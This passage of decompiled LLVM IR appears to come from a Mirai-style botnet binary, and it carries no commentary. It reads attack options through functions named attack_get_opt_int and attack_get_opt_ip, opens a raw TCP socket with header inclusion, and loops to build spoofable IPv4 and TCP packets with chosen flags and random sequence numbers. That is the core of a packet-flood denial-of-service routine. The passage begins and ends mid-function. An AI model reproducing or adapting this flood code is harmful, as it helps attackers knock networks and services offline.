  store i32 17, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3f4 = load i32, i32* @r5, align 4
  store i32 %v0_c3f4, i32* %r0.global-to-local, align 4
  %v5_c3f8 = inttoptr i32 %v0_c3e4 to i32*
  %v6_c3f8 = call i32 @attack_get_opt_int(i32 %v0_c3f4, i32* %v5_c3f8, i32 17, i32 0)
  %v0_c3fc = load i32, i32* @r4, align 4
  store i32 %v0_c3fc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c40c = load i32, i32* @r5, align 4
  store i32 %v0_c40c, i32* %r0.global-to-local, align 4
  %v5_c410 = inttoptr i32 %v0_c3fc to i32*
  %v6_c410 = call i32 @attack_get_opt_int(i32 %v0_c40c, i32* %v5_c410, i32 10, i32 0)
  %v0_c414 = load i32, i32* @r4, align 4
  store i32 %v0_c414, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c424 = load i32, i32* @r5, align 4
  store i32 %v0_c424, i32* %r0.global-to-local, align 4
  %v5_c428 = inttoptr i32 %v0_c414 to i32*
  %v6_c428 = call i32 @attack_get_opt_int(i32 %v0_c424, i32* %v5_c428, i32 11, i32 0)
  %v0_c42c = load i32, i32* @r4, align 4
  store i32 %v0_c42c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c43c = load i32, i32* @r5, align 4
  store i32 %v0_c43c, i32* %r0.global-to-local, align 4
  %v5_c440 = inttoptr i32 %v0_c42c to i32*
  %v6_c440 = call i32 @attack_get_opt_int(i32 %v0_c43c, i32* %v5_c440, i32 12, i32 0)
  %v0_c444 = load i32, i32* @r4, align 4
  store i32 %v0_c444, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c454 = load i32, i32* @r5, align 4
  store i32 %v0_c454, i32* %r0.global-to-local, align 4
  %v5_c458 = inttoptr i32 %v0_c444 to i32*
  %v6_c458 = call i32 @attack_get_opt_int(i32 %v0_c454, i32* %v5_c458, i32 13, i32 0)
  %v0_c45c = load i32, i32* @r4, align 4
  store i32 %v0_c45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c46c = load i32, i32* @r5, align 4
  store i32 %v0_c46c, i32* %r0.global-to-local, align 4
  %v5_c470 = inttoptr i32 %v0_c45c to i32*
  %v6_c470 = call i32 @attack_get_opt_int(i32 %v0_c46c, i32* %v5_c470, i32 14, i32 1)
  %v0_c474 = load i32, i32* @r4, align 4
  store i32 %v0_c474, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c484 = load i32, i32* @r5, align 4
  store i32 %v0_c484, i32* %r0.global-to-local, align 4
  %v5_c488 = inttoptr i32 %v0_c474 to i32*
  %v6_c488 = call i32 @attack_get_opt_int(i32 %v0_c484, i32* %v5_c488, i32 15, i32 0)
  %v0_c490 = load i32, i32* @r4, align 4
  store i32 %v0_c490, i32* %r1.global-to-local, align 4
  %v2_c494 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_c494, i32* %r3.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_c4a0 = load i32, i32* @r5, align 4
  store i32 %v0_c4a0, i32* %r0.global-to-local, align 4
  %v5_c4a4 = inttoptr i32 %v0_c490 to i32*
  %v6_c4a4 = call i32 @attack_get_opt_ip(i32 %v0_c4a0, i32* %v5_c4a4, i32 24, i32 %v2_c494, i32 %v6_c488)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @__GI_time(i32* null)
  %v1_c4b4 = load i32, i32* @r6, align 4
  %v2_c4b4 = add i32 %v1_c4b4, %v2_c4b0
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c4c8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c4c8, i32* %r0.global-to-local, align 4
  %v7_c4cc = icmp eq i32 %v3_c4c8, -1
  store i1 %v7_c4cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c4c8, i32* @r8, align 4
  br i1 %v7_c4cc, label %dec_label_pc_c9a0, label %dec_label_pc_c4d8

dec_label_pc_c4d8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c4e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c4e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c4f4 = call i32 @__GI_setsockopt(i32 %v3_c4c8, i32 0, i32 3, i32 %v6_c4e0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c4f4, i32* %r0.global-to-local, align 4
  %v7_c4f8 = icmp eq i32 %v5_c4f4, -1
  store i1 %v7_c4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c4f8, label %dec_label_pc_c9ac, label %dec_label_pc_c500

dec_label_pc_c500:                                ; preds = %dec_label_pc_c4d8
  %v3_c50c = mul i32 %v7_c34c, 65536
  store i32 %v3_c50c, i32* %r0.global-to-local, align 4
  %v0_c514 = load i32, i32* %fp.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c410, i32* %r1.global-to-local, align 4
  %v3_c520 = urem i32 %v7_c34c, 65536
  store i32 %v3_c520, i32* %r2.global-to-local, align 4
  %v3_c524 = urem i32 %v6_c3a8, 65536
  store i32 %v3_c524, i32* %r3.global-to-local, align 4
  %v3_c528 = urem i32 %v0_c514, 65536
  %v0_c52c = load i32, i32* @sb, align 4
  %v2_c52c = icmp eq i32 %v0_c52c, 0
  store i1 %v2_c52c, i1* %cpsr_z.global-to-local, align 1
  %v1_c53c = urem i32 %v6_c410, 256
  store i32 %v1_c53c, i32* @fp, align 4
  br i1 %v2_c52c, label %dec_label_pc_c790.preheader, label %dec_label_pc_c544

dec_label_pc_c544:                                ; preds = %dec_label_pc_c500
  %trunc = trunc i32 %v7_c34c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp60 = mul nuw nsw i32 %v3_c524, 256
  %v3_c570 = and i32 %tmp60, 65280
  %tmp61 = mul i32 %v0_c514, 256
  %v3_c574 = and i32 %tmp61, 65280
  %tmp62 = mul i32 %v5_c3e0, 256
  %v3_c578 = and i32 %tmp62, 65280
  %v1_c57c = urem i32 %v6_c410, 2
  %tmp63 = udiv i32 %v6_c3a8, 256
  %v4_c580 = urem i32 %tmp63, 256
  %v5_c580 = or i32 %v3_c570, %v4_c580
  %tmp64 = udiv i32 %v0_c514, 256
  %v4_c584 = urem i32 %tmp64, 256
  %v5_c584 = or i32 %v4_c584, %v3_c574
  store i32 %v5_c584, i32* @r5, align 4
  %tmp65 = udiv i32 %v5_c3e0, 256
  %v4_c588 = urem i32 %tmp65, 256
  %v5_c588 = or i32 %v4_c588, %v3_c578
  store i32 %v5_c588, i32* @lr, align 4
  %v1_c59c = urem i32 %v6_c428, 2
  store i32 %v1_c59c, i32* %r1.global-to-local, align 4
  %v1_c5a0 = urem i32 %v6_c440, 2
  store i32 %v1_c5a0, i32* %r2.global-to-local, align 4
  %v1_c5a4 = urem i32 %v6_c458, 2
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  %v1_c5a8 = urem i32 %v6_c470, 2
  store i32 %v1_c5a8, i32* @r6, align 4
  %v1_c5ac = urem i32 %v6_c488, 2
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_c628 = trunc i32 %v6_c364 to i8
  %sext6 = mul nuw i32 %v5_c580, 65536
  %v4_c654 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_c584, 65536
  %v6_c690 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_c59c
  %v4_c6a8 = and i32 %tmp, 16
  %tmp66 = sub nsw i32 0, %v1_c5a0
  %v4_c6c0 = and i32 %tmp66, 8
  %tmp67 = sub nsw i32 0, %v1_c5a4
  %v4_c6d4 = and i32 %tmp67, 4
  %tmp68 = sub nsw i32 0, %v1_c5a8
  %v3_c6e8 = and i32 %tmp68, 2
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %.thread, %dec_label_pc_c544
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c5dc = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c5dc, i32* %r0.global-to-local, align 4
  %v3_c5e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c5e0, i32* %r2.global-to-local, align 4
  %v1_c5e4 = load i32, i32* @sl, align 4
  %v2_c5e4 = load i32, i32* @r4, align 4
  %v5_c5e4 = mul i32 %v2_c5e4, 4
  %v6_c5e4 = add i32 %v5_c5e4, %v1_c5e4
  %v7_c5e4 = inttoptr i32 %v6_c5e4 to i32*
  store i32 %v2_c5dc, i32* %v7_c5e4, align 4
  %v0_c5e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c5e8 = mul i32 %v0_c5e8, 32
  store i32 %v3_c5e8, i32* %r3.global-to-local, align 4
  %v0_c5ec = load i32, i32* @sl, align 4
  %v4_c5ec = mul i32 %v0_c5e8, 4
  %v5_c5ec = add i32 %v0_c5ec, %v4_c5ec
  %v6_c5ec = inttoptr i32 %v5_c5ec to i32*
  %v7_c5ec = load i32, i32* %v6_c5ec, align 4
  store i32 %v7_c5ec, i32* %r4.global-to-local, align 4
  %v5_c5f0 = mul i32 %v0_c5e8, 24
  store i32 %v5_c5f0, i32* %r3.global-to-local, align 4
  %v1_c5f4 = load i32, i32* @r7, align 4
  %v2_c5f4 = add i32 %v1_c5f4, %v5_c5f0
  store i32 %v2_c5f4, i32* %r0.global-to-local, align 4
  %v1_c5f8 = inttoptr i32 %v7_c5ec to i8*
  %v2_c5f8 = load i8, i8* %v1_c5f8, align 1
  %tmp69 = urem i8 %v2_c5f8, 16
  %v1_c5fc = zext i8 %tmp69 to i32
  %v1_c600 = or i32 %v1_c5fc, 64
  store i32 %v1_c600, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v1_c600 to i8
  store i8 %v1_c604, i8* %v1_c5f8, align 1
  %v0_c608 = load i32, i32* %r4.global-to-local, align 4
  %v1_c608 = inttoptr i32 %v0_c608 to i8*
  %v2_c608 = load i8, i8* %v1_c608, align 1
  %v1_c60c = and i8 %v2_c608, -16
  %v1_c610 = or i8 %v1_c60c, 5
  store i32 %v1_c390, i32* %r1.global-to-local, align 4
  store i8 %v1_c610, i8* %v1_c608, align 1
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 1
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v5_c348, i8* %v4_c620, align 1
  store i32 %v1_c36c, i32* %r3.global-to-local, align 4
  %v2_c628 = load i32, i32* %r4.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 8
  %v4_c628 = inttoptr i32 %v3_c628 to i8*
  store i8 %v1_c628, i8* %v4_c628, align 1
  %v0_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = icmp eq i32 %v0_c630, 0
  store i1 %v2_c630, i1* %cpsr_z.global-to-local, align 1
  %v2_c634 = load i32, i32* %r4.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 4
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %rev, i16* %v4_c634, align 2
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_c63c = load i32, i32* %r4.global-to-local, align 4
  %v3_c63c = add i32 %v2_c63c, 9
  %v4_c63c = inttoptr i32 %v3_c63c to i8*
  store i8 6, i8* %v4_c63c, align 1
  %v0_c640 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c640, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c5d4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c644 = load i32, i32* %r4.global-to-local, align 4
  %v4_c644 = add i32 %v3_c644, 6
  %v5_c644 = inttoptr i32 %v4_c644 to i16*
  store i16 64, i16* %v5_c644, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c5d4, %bb
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  %v1_c64c = load i32, i32* %r4.global-to-local, align 4
  %v2_c64c = add i32 %v1_c64c, 12
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 %v6_c4a4, i32* %v3_c64c, align 4
  %v0_c650 = load i32, i32* %r0.global-to-local, align 4
  %v1_c650 = add i32 %v0_c650, 16
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  store i32 %v4_c654, i32* %r0.global-to-local, align 4
  %v2_c65c = load i32, i32* %r4.global-to-local, align 4
  %v3_c65c = add i32 %v2_c65c, 2
  %v4_c65c = inttoptr i32 %v3_c65c to i16*
  store i16 15360, i16* %v4_c65c, align 2
  %v0_c660 = load i32, i32* %r3.global-to-local, align 4
  %v1_c660 = load i32, i32* %r4.global-to-local, align 4
  %v2_c660 = add i32 %v1_c660, 16
  %v3_c660 = inttoptr i32 %v2_c660 to i32*
  store i32 %v0_c660, i32* %v3_c660, align 4
  %v0_c664 = load i32, i32* %r0.global-to-local, align 4
  %v1_c664 = trunc i32 %v0_c664 to i16
  %v2_c664 = load i32, i32* %r4.global-to-local, align 4
  %v3_c664 = add i32 %v2_c664, 20
  %v4_c664 = inttoptr i32 %v3_c664 to i16*
  store i16 %v1_c664, i16* %v4_c664, align 2
  %v0_c668 = load i32, i32* %r4.global-to-local, align 4
  %v1_c668 = add i32 %v0_c668, 20
  store i32 %v1_c668, i32* %r1.global-to-local, align 4
  %v1_c66c = add i32 %v0_c668, 32
  %v2_c66c = inttoptr i32 %v1_c66c to i8*
  %v3_c66c = load i8, i8* %v2_c66c, align 1
  %v4_c66c = zext i8 %v3_c66c to i32
  store i32 %v4_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add i32 %v0_c668, 33
  %v2_c670 = inttoptr i32 %v1_c670 to i8*
  %v3_c670 = load i8, i8* %v2_c670, align 1
  %v4_c670 = zext i8 %v3_c670 to i32
  store i32 %v1_c57c, i32* %r0.global-to-local, align 4
  %v1_c678 = urem i8 %v3_c66c, 16
  %v1_c67c = or i8 %v1_c678, -96
  %v1_c680 = and i32 %v4_c670, 223
  store i32 %v1_c680, i32* %r2.global-to-local, align 4
  store i8 %v1_c67c, i8* %v2_c66c, align 1
  %v0_c688 = load i32, i32* %r2.global-to-local, align 4
  %v1_c688 = load i32, i32* %r0.global-to-local, align 4
  %v4_c688 = mul i32 %v1_c688, 32
  %v5_c688 = or i32 %v4_c688, %v0_c688
  store i32 %v5_c688, i32* %r2.global-to-local, align 4
  store i32 %v5_c588, i32* %r0.global-to-local, align 4
  store i32 %v6_c690, i32* %r3.global-to-local, align 4
  %v1_c694 = trunc i32 %v5_c688 to i8
  %v2_c694 = load i32, i32* %r1.global-to-local, align 4
  %v3_c694 = add i32 %v2_c694, 13
  %v4_c694 = inttoptr i32 %v3_c694 to i8*
  store i8 %v1_c694, i8* %v4_c694, align 1
  %v0_c698 = load i32, i32* %r3.global-to-local, align 4
  %v1_c698 = trunc i32 %v0_c698 to i16
  %v2_c698 = load i32, i32* %r1.global-to-local, align 4
  %v3_c698 = add i32 %v2_c698, 2
  %v4_c698 = inttoptr i32 %v3_c698 to i16*
  store i16 %v1_c698, i16* %v4_c698, align 2
  %v0_c69c = load i32, i32* %r1.global-to-local, align 4
  %v1_c69c = add i32 %v0_c69c, 13
  %v2_c69c = inttoptr i32 %v1_c69c to i8*
  %v3_c69c = load i8, i8* %v2_c69c, align 1
  %v4_c69c = zext i8 %v3_c69c to i32
  store i32 %v1_c59c, i32* %r2.global-to-local, align 4
  %v1_c6a4 = and i32 %v4_c69c, 239
  %v5_c6a8 = or i32 %v1_c6a4, %v4_c6a8
  store i32 %v5_c6a8, i32* %r3.global-to-local, align 4
  %v0_c6ac = load i32, i32* %r0.global-to-local, align 4
  %v2_c6ac = add i32 %v0_c69c, 4
  %v3_c6ac = inttoptr i32 %v2_c6ac to i32*
  store i32 %v0_c6ac, i32* %v3_c6ac, align 4
  %v0_c6b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c6b0 = trunc i32 %v0_c6b0 to i8
  %v2_c6b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c6b0 = add i32 %v2_c6b0, 13
  %v4_c6b0 = inttoptr i32 %v3_c6b0 to i8*
  store i8 %v1_c6b0, i8* %v4_c6b0, align 1
  %v0_c6b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6b4 = add i32 %v0_c6b4, 13
  %v2_c6b4 = inttoptr i32 %v1_c6b4 to i8*
  %v3_c6b4 = load i8, i8* %v2_c6b4, align 1
  %v4_c6b4 = zext i8 %v3_c6b4 to i32
  store i32 %v1_c5a0, i32* %r3.global-to-local, align 4
  %v1_c6bc = and i32 %v4_c6b4, 247
  %v5_c6c0 = or i32 %v1_c6bc, %v4_c6c0
  store i32 %v5_c6c0, i32* %r2.global-to-local, align 4
  %v1_c6c4 = trunc i32 %v5_c6c0 to i8
  store i8 %v1_c6c4, i8* %v2_c6b4, align 1
  %v0_c6c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 13
  %v2_c6c8 = inttoptr i32 %v1_c6c8 to i8*
  %v3_c6c8 = load i8, i8* %v2_c6c8, align 1
  %v4_c6c8 = zext i8 %v3_c6c8 to i32
  store i32 %v1_c5a4, i32* %r0.global-to-local, align 4
  %v1_c6d0 = and i32 %v4_c6c8, 251
  %v5_c6d4 = or i32 %v1_c6d0, %v4_c6d4
  store i32 %v5_c6d4, i32* %r3.global-to-local, align 4
  %v1_c6d8 = trunc i32 %v5_c6d4 to i8
  store i8 %v1_c6d8, i8* %v2_c6c8, align 1
  %v0_c6dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c6dc = add i32 %v0_c6dc, 13
  %v2_c6dc = inttoptr i32 %v1_c6dc to i8*
  %v3_c6dc = load i8, i8* %v2_c6dc, align 1
  %v4_c6dc = zext i8 %v3_c6dc to i32
  store i32 %v1_c5a8, i32* %r3.global-to-local, align 4
  %v1_c6e4 = and i32 %v4_c6dc, 253
  %v4_c6e8 = or i32 %v1_c6e4, %v3_c6e8
  store i32 %v4_c6e8, i32* %r2.global-to-local, align 4
  %v1_c6ec = trunc i32 %v4_c6e8 to i8
  store i8 %v1_c6ec, i8* %v2_c6dc, align 1
  %v0_c6f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6f0 = add i32 %v0_c6f0, 13
  %v2_c6f0 = inttoptr i32 %v1_c6f0 to i8*
  %v3_c6f0 = load i8, i8* %v2_c6f0, align 1
  %v4_c6f0 = zext i8 %v3_c6f0 to i32
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  %v1_c6f8 = and i32 %v4_c6f0, 254
  %v2_c6fc = or i32 %v1_c6f8, %v1_c5ac
  store i32 %v2_c6fc, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 4, i32* @r6, align 4
  %v1_c708 = trunc i32 %v2_c6fc to i8
  store i8 %v1_c708, i8* %v2_c6f0, align 1
  %v0_c70c = load i32, i32* @r5, align 4
  %v1_c70c = trunc i32 %v0_c70c to i8
  %v2_c70c = load i32, i32* %r4.global-to-local, align 4
  %v3_c70c = add i32 %v2_c70c, 40
  %v4_c70c = inttoptr i32 %v3_c70c to i8*
  store i8 %v1_c70c, i8* %v4_c70c, align 1
  %v0_c710 = load i32, i32* @r6, align 4
  %v1_c710 = trunc i32 %v0_c710 to i8
  %v2_c710 = load i32, i32* %r4.global-to-local, align 4
  %v3_c710 = add i32 %v2_c710, 41
  %v4_c710 = inttoptr i32 %v3_c710 to i8*
  store i8 %v1_c710, i8* %v4_c710, align 1
  %v0_c714 = call i32 @rand_next()
  %v1_c718 = urem i32 %v0_c714, 16
  %v1_c71c = or i32 %v1_c718, 1392
  %v1_c720 = add nuw nsw i32 %v1_c71c, 8
  %v3_c724 = mul nuw nsw i32 %v1_c720, 65536
  store i32 %v3_c724, i32* %r0.global-to-local, align 4
  %v3_c728 = mul nuw nsw i32 %v1_c720, 256
  %v5_c730 = or i32 %v3_c728, 5
  %v1_c734 = trunc i32 %v5_c730 to i16
  %v2_c734 = load i32, i32* %r4.global-to-local, align 4
  %v3_c734 = add i32 %v2_c734, 42
  %v4_c734 = inttoptr i32 %v3_c734 to i16*
  store i16 %v1_c734, i16* %v4_c734, align 2
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_c740 = load i32, i32* %r4.global-to-local, align 4
  %v3_c740 = add i32 %v2_c740, 46
  %v4_c740 = inttoptr i32 %v3_c740 to i8*
  store i8 8, i8* %v4_c740, align 1
  %v0_c744 = load i32, i32* %r2.global-to-local, align 4
  %v1_c744 = trunc i32 %v0_c744 to i8
  %v2_c744 = load i32, i32* %r4.global-to-local, align 4
  %v3_c744 = add i32 %v2_c744, 47
  %v4_c744 = inttoptr i32 %v3_c744 to i8*
  store i8 %v1_c744, i8* %v4_c744, align 1
  %v0_c748 = load i32, i32* @r6, align 4
  %v1_c748 = trunc i32 %v0_c748 to i8
  %v2_c748 = load i32, i32* %r4.global-to-local, align 4
  %v3_c748 = add i32 %v2_c748, 44
  %v4_c748 = inttoptr i32 %v3_c748 to i8*
  store i8 %v1_c748, i8* %v4_c748, align 1
  %v0_c74c = load i32, i32* @r5, align 4
  %v1_c74c = trunc i32 %v0_c74c to i8
  %v2_c74c = load i32, i32* %r4.global-to-local, align 4
  %v3_c74c = add i32 %v2_c74c, 45
  %v4_c74c = inttoptr i32 %v3_c74c to i8*
  store i8 %v1_c74c, i8* %v4_c74c, align 1
  %v0_c750 = call i32 @rand_next()
  store i32 %v0_c750, i32* %r0.global-to-local, align 4
  %v2_c758 = load i32, i32* %r4.global-to-local, align 4
  %v3_c758 = add i32 %v2_c758, 59
  %v4_c758 = inttoptr i32 %v3_c758 to i8*
  store i8 6, i8* %v4_c758, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c768 = load i32, i32* %r4.global-to-local, align 4
  %v2_c768 = add i32 %v1_c768, 48
  %v3_c768 = inttoptr i32 %v2_c768 to i32*
  store i32 %v0_c750, i32* %v3_c768, align 4
  %v0_c76c = load i32, i32* %r3.global-to-local, align 4
  %v1_c76c = load i32, i32* %r4.global-to-local, align 4
  %v2_c76c = add i32 %v1_c76c, 52
  %v3_c76c = inttoptr i32 %v2_c76c to i32*
  store i32 %v0_c76c, i32* %v3_c76c, align 4
  %v0_c770 = load i32, i32* %r2.global-to-local, align 4
  %v1_c770 = trunc i32 %v0_c770 to i8
  %v2_c770 = load i32, i32* %r4.global-to-local, align 4
  %v3_c770 = add i32 %v2_c770, 56
  %v4_c770 = inttoptr i32 %v3_c770 to i8*
  store i8 %v1_c770, i8* %v4_c770, align 1
  %v0_c774 = load i32, i32* %r1.global-to-local, align 4
  %v1_c774 = trunc i32 %v0_c774 to i8
  %v2_c774 = load i32, i32* %r4.global-to-local, align 4
  %v3_c774 = add i32 %v2_c774, 58
  %v4_c774 = inttoptr i32 %v3_c774 to i8*
  store i8 %v1_c774, i8* %v4_c774, align 1
  %v0_c778 = load i32, i32* %r1.global-to-local, align 4
  %v1_c778 = trunc i32 %v0_c778 to i8
  %v2_c778 = load i32, i32* %r4.global-to-local, align 4
  %v3_c778 = add i32 %v2_c778, 57
  %v4_c778 = inttoptr i32 %v3_c778 to i8*
  store i8 %v1_c778, i8* %v4_c778, align 1
  %v3_c77c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c77c, i32* %r3.global-to-local, align 4
  %v1_c780 = load i32, i32* %r2.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, %v3_c77c
  store i32 %v2_c780, i32* @r4, align 4
  %v1_c784 = load i32, i32* @sb, align 4
  %v9_c784 = icmp eq i32 %v2_c780, %v1_c784
  store i1 %v9_c784, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c780, i32* %stack_var_-44, align 4
  %v5_c78c = icmp slt i32 %v2_c780, %v1_c784
  br i1 %v5_c78c, label %dec_label_pc_c5d4, label %dec_label_pc_c790.preheader

dec_label_pc_c790.preheader:                      ; preds = %.thread, %dec_label_pc_c500
  %v0_c79410 = phi i32 [ 0, %dec_label_pc_c500 ], [ %v1_c784, %.thread ]
  %v2_c7ac = icmp eq i32 %v6_c4a4, -1
  %v7_c7ac = icmp eq i32 %v6_c4a4, -1
  %v3_c7c0 = icmp eq i32 %v3_c520, 65535
  br label %dec_label_pc_c790

dec_label_pc_c790:                                ; preds = %dec_label_pc_c98c.dec_label_pc_c790_crit_edge, %dec_label_pc_c790.preheader
  %v0_c794 = phi i32 [ %v0_c794.pre, %dec_label_pc_c98c.dec_label_pc_c790_crit_edge ], [ %v0_c79410, %dec_label_pc_c790.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c794 = icmp eq i32 %v0_c794, 0
  store i1 %v2_c794, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c794, label %dec_label_pc_c98c, label %dec_label_pc_c7a0

dec_label_pc_c7a0:                                ; preds = %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c884

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c884
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7c0, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  %v1_c7cc = phi i32 [ %v1_c914, %dec_label_pc_c904 ], [ 65535, %dec_label_pc_c7b4 ]
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  %v9_c7cc = icmp eq i32 %v3_c524, %v1_c7cc
  store i1 %v9_c7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7cc, label %dec_label_pc_c934, label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge, %dec_label_pc_c7c8
  %v1_c7d8 = phi i32 [ %v1_c7d8.pre, %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge ], [ %v1_c7cc, %dec_label_pc_c7c8 ]
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v9_c7d8 = icmp eq i32 %v3_c528, %v1_c7d8
  store i1 %v9_c7d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7d8, label %dec_label_pc_c948, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge, %dec_label_pc_c7d4
  %v1_c7e4 = phi i32 [ %v1_c7e4.pre, %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge ], [ %v1_c7d8, %dec_label_pc_c7d4 ]
  store i32 %v5_c3e0, i32* %r3.global-to-local, align 4
  %v9_c7e4 = icmp eq i32 %v5_c3e0, %v1_c7e4
  store i1 %v9_c7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7e4, label %dec_label_pc_c95c, label %dec_label_pc_c7ec

dec_label_pc_c7ec:                                ; preds = %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge, %dec_label_pc_c7e0
  %v1_c7f0 = phi i32 [ %v1_c7f0.pre, %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge ], [ %v1_c7e4, %dec_label_pc_c7e0 ]
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v9_c7f0 = icmp eq i32 %v6_c3f8, %v1_c7f0
  store i1 %v9_c7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7f0, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c7f8 = load i32, i32* @fp, align 4
  %v2_c7f8 = icmp eq i32 %v0_c7f8, 0
  store i1 %v2_c7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7f8, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970, %dec_label_pc_c980
  %v2_c804 = load i32, i32* @r5, align 4
  %v3_c804 = add i32 %v2_c804, 10
  %v4_c804 = inttoptr i32 %v3_c804 to i16*
  store i16 0, i16* %v4_c804, align 2
  %v0_c808 = load i32, i32* @r5, align 4
  store i32 %v0_c808, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
